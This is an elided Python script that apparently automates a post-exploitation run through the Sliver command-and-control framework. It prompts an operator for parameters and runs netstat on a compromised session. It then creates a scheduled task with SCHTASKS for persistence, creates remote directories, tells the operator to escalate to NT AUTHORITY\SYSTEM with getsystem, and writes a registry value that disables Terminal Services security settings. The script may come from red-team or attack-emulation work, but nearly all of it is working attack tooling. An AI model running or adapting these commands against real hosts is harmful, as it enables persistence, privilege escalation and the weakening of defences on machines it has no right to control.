...
async def main():
    ...
    config = load_config(
        config_file_path="/home/kali/Desktop/xiangmu/attack_executor-main/aurora/executor/config.ini"
    )
    ...
    default_val = "True"
    user_input = (
        console.input(f"[bold]➤ Enter value for tcp [default: {default_val}]: [/]")
        or default_val
    )
    ...
    default_val = "True"
    user_input = (
        console.input(f"[bold]➤ Enter value for udp [default: {default_val}]: [/]")
        or default_val
    )
    if not user_input and False:
    ...
    default_val = "True"
    user_input = (
        console.input(f"[bold]➤ Enter value for ipv4 [default: {default_val}]: [/]")
        or default_val
    )
    if not user_input and False:
    ...
    default_val = "True"
    user_input = (
        console.input(f"[bold]➤ Enter value for ipv6 [default: {default_val}]: [/]")
        or default_val
    )
    if not user_input and False:
    ...
    confirm_action()
    try:
        await sliver_executor.netstat(
            user_params["tcp"],
            user_params["udp"],
            user_params["ipv4"],
            user_params["ipv6"],
            user_params["listening"],
    ...
    default_val = "1210"
    user_input = (
        console.input(f"[bold]➤ Enter value for time [default: {default_val}]: [/]")
        or default_val
    )
    if not user_input and False:
        raise ValueError("Missing required parameter: time")
    user_params["time"] = user_input
    commands = f"""SCHTASKS /Create /SC ONCE /TN spawn /TR {user_params["task_command"]} /ST {user_params["time"]}"""
    ...
    """
    await sliver_executor.powershell(
        session_id=sliver_sessionid, input_commands=commands
    )
    ...
    confirm_action()
    try:
        await sliver_executor.mkdir(
            user_params["remote_path"], user_params["SessionID"]
        )
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise
    ...
    console.print(
        "In the Sliver C2 console, execute the [bold green]getsystem[/bold green] command on a session with local administrator privileges to obtain a session under the NT AUTHORITY\SYSTEM account. Once elevated system privileges are acquired, you can select this high-privilege session to perform subsequent operations."
    )
    confirm_action()
    sliver_sessionid = await sliver_executor.select_sessions()
    ...
    confirm_action()
    commands = f"""reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f"""
    await sliver_executor.cmd(session_id=sliver_sessionid, input_commands=commands)
